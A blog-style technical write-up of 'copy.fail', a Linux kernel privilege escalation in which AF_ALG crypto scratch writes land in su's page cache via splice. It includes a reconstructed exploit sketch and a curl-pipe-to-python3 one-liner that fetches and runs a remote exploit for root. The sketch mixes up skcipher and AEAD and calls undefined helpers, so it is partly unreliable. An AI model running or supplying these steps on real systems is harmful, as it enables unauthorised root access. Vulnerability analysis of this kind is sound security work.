+++
title = "copy.fail: Four Bytes of Scratch Data and You're Root"
date = "2026-07-15"
+++

There's a 732-byte Python script floating around that gets you root on basically every Linux distro shipped since 2017. No offsets to guess, no KASLR to defeat, no race condition you need to win against your specific kernel build. Even with a beautified copy of the proof-of-concept sitting in front of me, I still had to sketch the scatterlists out on paper to follow it. This is a memory corruption bug where, strictly speaking, nothing actually gets corrupted. That's what makes it elegant, and it's exactly why it's so hard to fix cleanly.

## Setting the stage: AF_ALG

The whole bug lives inside the kernel's crypto API interface, `AF_ALG`. You open a socket, bind it to the name of an algorithm, and the kernel handles the cryptography for you — hardware-accelerated when the hardware supports it. The relevant family here is AEAD, authenticated encryption with associated data, and its contract is what matters: data has to arrive as AAD first, then ciphertext, then the tag, essentially HMAC-style authentication layered on top of encryption.

Under the hood, each socket is backed by scatterlists — linked lists of memory pages, each with its own offset and length. Your `sendmsg` call drops your user-space pages into the input scatterlist. Separately, the kernel allocates fresh pages for an output scatterlist, where the results land for you to read back later. Two distinct lists. Hold onto that detail — it matters in a moment.

## Where it breaks

Back in 2017, an in-place optimization was added that saves a page allocation by pointing the *output* destination directly at the *input* page — the same page holding your plaintext and tags. On its own, that's fine; it's all kernel-owned crypto data either way. But for one specific IPsec algorithm that uses extended sequence numbers, computing the HMAC needs a tiny scratch pad — just four bytes — and the code writes that scratch data *just past* the tag region, spilling outside the bounds of what should be the input-only scatterlist.

So what you're left with, as a raw primitive, is a four-byte write at a controlled offset, landing on a page that was never supposed to be writable in the first place. The clever part — and this is where the original writeup really earns its keep — is that you don't have to send the tag page as part of your own `sendmsg` call. You can splice a completely different page in from wherever you'd rather it land:

```python
# the exploit shape (reconstructed from the writeup)
alg = socket(AF_ALG, SOCK_SEQPACKET)
alg.bind(("skcipher", "cbc(aes)"))        # encryption...
alg.setsockopt(SOL_ALG, ALG_SET_KEY, key)
req = alg.accept()                         # request socket

req.sendmsg(aad + ciphertext)              # AAD + data → input scatterlist
# ← NOT the tag. instead:
os.open("/usr/bin/su", ...)                # → page-cache pages for su
pipe_fd = pipe()
splice(pipe chain: su_fd → crypto_socket)  # su's page NOW in scatterlist
# crypto engine writes its 4-byte ESN scratch
#   → lands INSIDE THE PAGE-CACHE PAGE OF /usr/bin/su
write4(target_fd, offset, b"AAAA")         # repeat for each 4-byte chunk
```

`splice` connects a pipe between your file descriptor and the crypto socket, and it does something genuinely remarkable in the process: it appends the actual page-cache page belonging to `/usr/bin/su` onto the scatterlist. The four bytes of scratch data the crypto engine was already writing past the tag boundary now land squarely inside the cached copy of `su`.

And because `splice` accepts an offset argument, the "write four bytes anywhere" primitive comes pre-wrapped for you: write at offset 0, then offset 4, then offset 8, and so on, until the kernel's entire cached copy of `su` has quietly become your shellcode instead of the real setuid binary.

## Why this gets you root

The elegant part is just how little work is left to do at this point. The actual `su` binary on disk never changes — not a single byte. But the kernel serves program execution straight out of the page cache, and the page cache now holds your shellcode instead. As far as the kernel is concerned, it's still looking at a setuid binary, so the moment anything executes it, your shellcode runs as UID 0. The whole demo fits on one line:

```bash
curl -s https://copy.fail/exploit.py | python3 - ; su -c id
# → uid=0(root) with no password prompt
```

The published proof-of-concept ships its shellcode gzipped, but that's purely a convenience for keeping the demo compact — nothing about the exploit actually requires it.

## The fix, and what it says about the bug

The mainline patch (commit A664B in the revert chain) simply removes the 2017 in-place optimization that let input and output scatterlists alias each other in the first place. If you're looking for a stopgap this month: where AEAD ships as a loadable kernel module, blacklisting it and blocking autoload works fine as a defensive measure. If it's compiled directly into your kernel, there's no shortcut — you're waiting on whichever kernel release ships the revert.

## What this really is

Every universal local privilege escalation is, at bottom, a story about a contract that holds everywhere except in the one place someone forgot to check. The AEAD contract says input pages are read-only, full stop. A 2017 optimization quietly broke that guarantee in one narrow corner case — scratch writes spilling past the tag — and everyone's threat model for that corner case was some version of "it's just our own crypto state, who's going to care." The honest answer turned out to be: the page cache cares, and the page cache is everyone.

I keep coming back to the phrase someone used to describe this — one of the most beautiful exploits they'd seen in a while. I get why. The raw primitive is four bytes. The decade-old architectural decision that turns those four bytes fatal shipped in every mainstream distro, and the whole thing reads almost like an engineering joke: a write the kernel never intended to be a write, aimed at a file the kernel never double-checks precisely because it's cache, not memory. There's a whole lineage of these now — copy.fail, Dirty Pipe, Dirty Cow — all variations on the same theme: write four bytes into wherever the kernel happens to be keeping its copy of the truth. Spotting the exploit itself was never really the hard part. Patch cadence is the actual game here, and this particular bug had a full decade of runway before anyone thought to look.
